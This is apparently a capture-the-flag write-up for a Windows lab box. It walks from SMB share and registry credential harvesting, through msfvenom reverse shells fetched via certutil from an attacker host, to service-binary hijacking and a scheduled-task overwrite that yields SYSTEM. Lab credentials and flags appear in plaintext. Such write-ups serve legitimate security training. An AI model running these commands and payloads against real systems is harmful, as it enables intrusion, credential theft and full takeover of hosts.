
# CTF Writeup: Windows Jump

---
## Reconnaissance

An initial scan revealed the following detailled information about all running services on the target system.

```
nmap -A -p- --min-rate 10000 10.112.164.197
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 17:25 -0500
Warning: 10.112.164.197 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.112.164.197
Host is up (0.012s latency).
Not shown: 65463 closed tcp ports (reset), 57 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: PRIVESC
|   NetBIOS_Domain_Name: PRIVESC
|   NetBIOS_Computer_Name: PRIVESC
|   DNS_Domain_Name: privesc
|   DNS_Computer_Name: privesc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-17T22:27:13+00:00
| ssl-cert: Subject: commonName=privesc
| Not valid before: 2026-05-10T06:39:22
|_Not valid after:  2026-11-09T06:39:22
|_ssl-date: 2026-07-17T22:27:20+00:00; -2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=7/17%OT=135%CT=1%CU=40614%PV=Y%DS=3%DC=T%G=Y%TM=6A5AAC
OS:4A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(SP=103%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=2%IS
OS:R=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%II=I%S
OS:S=S%TS=U)SEQ(SP=EA%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M4E8NW8
OS:NNS%O2=M4E8NW8NNS%O3=M4E8NW8%O4=M4E8NW8NNS%O5=M4E8NW8NNS%O6=M4E8NNS)WIN(
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF
OS:%O=M4E8NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%R
OS:D=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2026-07-17T22:27:16
|_  start_date: N/A

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   8.00 ms  192.168.128.1
2   ...
3   10.40 ms 10.112.164.197

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.86 seconds
```

Since we know about the lateral movement of guest -> thmuser -> notadmin -> svcadmin -> SYSTEM

I will start by enumerating shares as guest user.

```
nxc smb 10.112.164.197 -u guest -p '' --shares
```

There seems to be an non-default Share called "Public" in which we have read permissions. Let's check it out.

```
smbclient \\\\10.112.164.197/Public -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> get welcome.txt
```

There was an .txt file and I downloaded it onto my local machine. It provided credentials for the thmuser. Added those credentials to our users.txt and passwords.txt wordlists.

```
thmuser:Password1!
```

Sprayed credentials with nxc and found out that the "thmuser" can connect to the target system via RDP!

```
nxc rdp 10.112.164.197 -u users.txt -p passwords.txt --continue-on-success
```

Connected to the target system via RDP.

```
xfreerdp3 /cert:ignore /clipboard /compression /auto-reconnect /u:thmuser /p:Password1! /v:10.112.164.197 /w:1600 /h:800 /drive:test,/home/saitama/Desktop
```

Retrieved flag1.txt in C:\Users\thmuser\Desktop.

```
THM{5mb_cr3d5_1n_th3_5h4r3}
```

Tried many things, but after some Enumeration Techniques I enumerated AutoLogon Credentials and found Credentials for "notadmin".

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Added the discovered credentials to my wordlists.

```
notadmin:P@ssw0rd!
```

I sprayed credentials again and it looks like I could connect with this account to RDP aswell, but it didn't work! I will open CMD as this user.

Retrieved flag2.txt in C:\Users\notadmin\Desktop.

```
THM{w1nl0g0n_cr3ds_3xp0s3d}
```

On my local machine I created an reverse shell using msfvenom.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
```

Started up python3 webserver in the directory in which my shell.exe file is stored.

```
python3 -m http.server 80
```

Executed the following command on the target system CMD Session to transfer my shell.exe onto the target system.

```
certutil -urlcache -split -f http://192.168.170.177/shell.exe shell.exe
```

Started up netcat listener on port 443.

```
rlwrap nc -lvnp 443
```

Executed the reverse shell script on the target system.

```
.\shell.exe
```

Gained RCE as user "notadmin".

```
rlwrap nc -lvnp 443                                     
listening on [any] 443 ...
connect to [192.168.170.177] from (UNKNOWN) [10.112.164.197] 50208
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>
```

Transfered winPEAS onto the target system.

```
certutil -urlcache -split -f http://192.168.170.177/winPEASx64.exe winPEAS.exe
```

Ran it to find an potential priv esc vector.
Didn't find anything.

I tested a lot of things including runas.exe, trying FullPowers.exe. But I continued with PowerUp.ps1. I first downloaded the powershell script onto the target system.

```
certutil -urlcache -split -f http://192.168.170.177/PowerUp.ps1 PowerUp.ps1
```

Navigated to powershell and bypassed execution policies.

```
powershell -ep bypass
```

Execute it

```
. .\PowerUp.ps1
```

Now we can use "Get-ModifiableServiceFile".

It shows an modifiable .exe file in C:\Windows\THMSVC called "svc.exe" which is owned by svcadmin. Let's create an malicious svc.exe file and replace it with the svc.exe file.

Backed up the original svc.exe file.

```
mv svc.exe svc-backup.exe
```

Created the svc.exe payload on my local machine

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o svc.exe
```

Started up python3 webserver in the directory in which my payload is stored.

```
python3 -m http.server 80
```

Transfered the payload onto the target system in C:\Windows\THMSVC

```
certutil -urlcache -split -f http://192.168.170.177/svc.exe svc.exe
```

We now need to somehow stop and start the service, so we the payload gets executed.

Started up listener on port 443

```
rlwrap nc -lvnp 443
```

Unfortunately just prompting the followign command didnt work out for me.

```
sc.exe start THMSvc
```

Added extra permissions to the .exe file.

```
icacls svc.exe /grant Everyone:F
```

Started up the service and gained RCE!

```
sc.exe start THMSvc
```

Retrieved flag3.txt in C:\Users\svcadmin\Desktop.

```
THM{s3rv1c3_b1n4ry_h1j4ck3d}
```

Found an interesting .bat file in C:\Windows\Tasks and enumerated permissions on it.

```
icacls C:\Windows\Tasks\cleanup.bat
```

We have write permissions!

Since this is an scheduled task and owned by System, I could add that it executes an reverse shell .exe file to get SYSTEM Shell.

I will create another payload now on my local machine.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8888 -f exe -o shell.exe
```

Started up listener on port 8888.

```
rlwrap nc -lvnp 8888
```

Started up python3 webserver in the directory in which my payload is stored.

```
python3 -m http.server 80
```

Transfered my new payload onto the target system.

```
certutil -urlcache -split -f http://192.168.170.177/shell.exe shell.exe
```

I replaced the content inside the .bat file with my payload.

```
cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
```

Gained RCE as SYSTEM User.

```
rlwrap nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.170.177] from (UNKNOWN) [10.114.142.37] 50289
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Retrieved flag4.txt in C:\

```
THM{t4sk_wr1t3_t0_SYST3M}
```